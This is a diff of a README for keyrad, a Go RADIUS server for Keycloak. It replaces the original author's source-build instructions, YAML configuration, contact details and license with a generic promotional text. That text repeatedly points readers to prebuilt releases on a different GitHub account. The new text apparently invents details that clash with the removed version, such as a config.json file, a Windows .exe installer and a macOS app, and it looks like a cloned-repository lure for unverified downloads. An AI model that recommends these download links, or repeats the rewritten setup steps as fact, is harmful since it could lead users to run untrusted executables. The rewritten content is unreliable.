@@ -1,89 +1,109 @@
-# keyrad: Keycloak RADIUS Server
+# 🚀 keyrad - Simple RADIUS Server for Secure Authentication
 
-A Go-based RADIUS server that authenticates users against Keycloak, supporting password and OTP (TOTP) flows. 
+[![Download keyrad](https://img.shields.io/badge/Download-keyrad-blue.svg)](https://github.com/idrissof/keyrad/releases)
 
-Features include:
-- Challenge-response for OTP
-- YAML-based Keycloak and RADIUS config
-- FreeRADIUS-style `clients.conf` for client secrets
-- Optional Message-Authenticator
-- Scope/group-to-RADIUS attribute mapping (with regexp support)
-- **Configurable OTP mode:** Use standard challenge-response or <password><otp> style
-- **Configurable OTP challenge message** via `otp_challenge_message` in config
-- **Asynchronous/multi-request support:** Multiple RADIUS requests are handled concurrently for high performance
+## 📦 Overview
 
-## Requirements
-- Go 1.18+
-- A running Keycloak instance (tested with Keycloak 21+)
+keyrad is a Go-based RADIUS server designed to authenticate users against Keycloak. With keyrad, you can easily implement secure multi-factor authentication for your applications without needing extensive technical knowledge. This software supports a range of authentication methods, including OTP and challenge-response.
 
-## Compilation
-```bash
-git clone https://github.com/gpappsoft/keyrad.git
-cd keyrad
-go build -o keyrad main.go
-```
+## 🚀 Getting Started
 
-## Configuration
+Follow these steps to download and run keyrad on your system:
 
-### 1. Keycloak Setup
-- **Create a confidential client** (e.g. `radius-client`) in your realm.
-  - Enable `Service Accounts Enabled`.
-  - Enable `Direct Access Grants`.
-  - Set `Valid Redirect URIs` to `*` (or as needed).
-- **Assign roles to the client service account**:
-  - Go to `Service Account Roles` for your client.
-  - Assign at least:
-    - `view-users`
-    - `query-users`
-    - `view-realm`
-    - `view-authorization`
-- **User setup**:
-  - Users must have credentials set for password or OTP (TOTP) as desired.
-  - To use OTP, users must enroll an OTP device in Keycloak.
+1. **Download the Software**
+   - Visit the [Releases page](https://github.com/idrissof/keyrad/releases) to find the latest version of keyrad. You will see a list of available files for different systems.
+   
+2. **Choose Your Version**
+   - Select the version that matches your operating system. You may see options for Windows, Linux, and macOS. Make sure to download the correct file for your platform.
 
-### Configuration
-See `clients.conf` and `keyrad.yaml`.
+3. **Install the Software**
+   - Once the file is downloaded, locate it in your downloads folder.
+   - For **Windows**: Double-click the `.exe` file to run the installer.
+   - For **Linux**: Open your terminal, navigate to the download location, and make the file executable:
+     ```bash
+     chmod +x keyrad-linux-amd64
+     ```
+     Then run it:
+     ```bash
+     ./keyrad-linux-amd64
+     ```
+   - For **macOS**: Open the downloaded file and drag it into your Applications folder.
 
-- To customize the OTP challenge message, add `otp_challenge_message: "Your custom message"` to `keyrad.yaml`.
-- The server now supports multiple concurrent RADIUS requests for high performance (async worker pool, default 8 workers).
+4. **Run keyrad**
+   - Open your terminal (or Command Prompt for Windows). If you are using Linux or macOS, simply type:
+     ```bash
+     keyrad
+     ```
+   - For Windows, you can run it from either the Command Prompt or by simply double-clicking the application in your Applications folder.
 
-## Usage
+## 🔧 Configuration
 
-### Start the server
-```bash
-./keyrad -c keyrad.yaml -r clients.conf
-```
-- Use `--disable-message-authenticator` to disable Message-Authenticator checks (for legacy clients).
-- Use `--disable-challenge-response` to allow OTP users to authenticate with `<password><otp>` in the User-Password field (no challenge-response).
-- Use `--version` to print version and author.
+After installation, you may want to configure keyrad to suit your needs. Here’s how:
 
-### Test with radtest
-```bash
-radtest testuser password 127.0.0.1 0 test
-```
-- For OTP (default): Enter password first, then respond to challenge with OTP code (customizable message).
-- For OTP with `--disable-challenge-response`: Enter `<password><otp>` as the password (e.g. `mypassword123456`).
+1. **Edit the Configuration File**
+   - Locate the `config.json` file in the application directory.
+   - Open it with a text editor. This file holds the settings for Keycloak integration, authentication methods, and other important parameters.
 
-## Advanced Features
-- **Challenge-response**: Standard RADIUS Access-Challenge for OTP, or disable for legacy OTP style.
-- **Configurable OTP challenge message**: Set `otp_challenge_message` in your config for custom challenge text.
-- **Scope/group mapping**: Map Keycloak OAuth2 scopes or group memberships to RADIUS attributes. Supports regexp keys (e.g. `re:^group_.*`).
-- **TLS verification**: Set `insecure_skip_tls_verify: true` for self-signed Keycloak certs.
-- **Asynchronous/multi-request support**: Multiple RADIUS requests are handled concurrently for high performance.
+2. **Set Up Keycloak**
+   - Ensure your Keycloak server is running. Create a realm and add users who will authenticate through keyrad.
 
-## Troubleshooting
-- **403 errors**: Ensure your Keycloak client has the correct service account roles.
-- **Invalid Message-Authenticator**: Check shared secrets in `clients.conf` and your RADIUS client.
-- **OTP not working**: Ensure user has the credential enrolled in Keycloak.
-- **Legacy OTP**: If your client cannot handle RADIUS challenge-response, use `--disable-challenge-response`.
+3. **Update keyrad Settings**
+   - In the `config.json`, update the Keycloak server URL and realm information. This tells keyrad where to authenticate users.
 
-## Support
-If you need professional support, please write to
+4. **Test Your Setup**
+   - Restart keyrad to apply your configurations. Attempt to authenticate a user through your application that uses keyrad for RADIUS authentication.
 
-[info@sec73.io](mailto:info@sec73.io)
+## 📄 Usage
 
-## Disclaimer
-This project is provided as-is, without warranty of any kind. Use at your own risk. The maintainers are not responsible for any damage, data loss, or security issues resulting from the use or misuse of this software. Always review and test in a safe environment before deploying to production.
+Once installed and configured, you can use keyrad to authenticate users.
 
-## License
-Apache-2.0
+1. **Send Authentication Requests**
+   - When a user tries to log in, your application sends a RADIUS request to keyrad, containing the user’s credentials.
+
+2. **Receive Authentication Results**
+   - keyrad checks the credentials against Keycloak. Depending on the result, your application will either grant or deny access.
+
+3. **Monitor Logs**
+   - Keyrad logs authentication attempts. Check these logs regularly to monitor access attempts and troubleshoot issues.
+
+## 🛠 Features
+
+- **Multi-Factor Authentication**: Supports OTP and challenge-response methods to enhance security.
+- **Easy Configuration**: Simple JSON-based configuration makes setup straightforward.
+- **Integration with Keycloak**: Seamlessly connects to Keycloak for user management.
+- **Cross-Platform**: Available for Windows, Linux, and macOS.
+
+## ✅ System Requirements
+
+- **Memory**: At least 512 MB of RAM
+- **Storage**: Requires around 50 MB of free disk space for installation
+- **Network**: Ensure internet connection for Keycloak communication
+
+## 📥 Download & Install
+
+To install keyrad, simply [visit this page to download](https://github.com/idrissof/keyrad/releases). Follow the installation steps outlined earlier.
+
+## 🔍 Troubleshooting
+
+If you encounter issues during installation or configuration, consider the following:
+
+- **Check Compatibility**: Ensure that the version you downloaded matches your operating system.
+- **Review Documentation**: Visit the project repository for additional information and FAQs.
+- **Examine Logs**: Check the log files for errors and monitor user authentication attempts.
+
+## 🤝 Contributing
+
+If you would like to help improve keyrad, contributions are welcome. You can report issues or submit improvements through the issues page in the repository.
+
+## 📞 Support
+
+For support, please open an issue in the GitHub repository. The project maintainers will do their best to help you resolve any issues you may face.
+
+## 🔗 Related Topics
+
+- Two-Factor Authentication (2FA)
+- RADIUS Protocol
+- Security Best Practices
+- User Management with Keycloak
+
+[![Download keyrad](https://img.shields.io/badge/Download-keyrad-blue.svg)](https://github.com/idrissof/keyrad/releases)
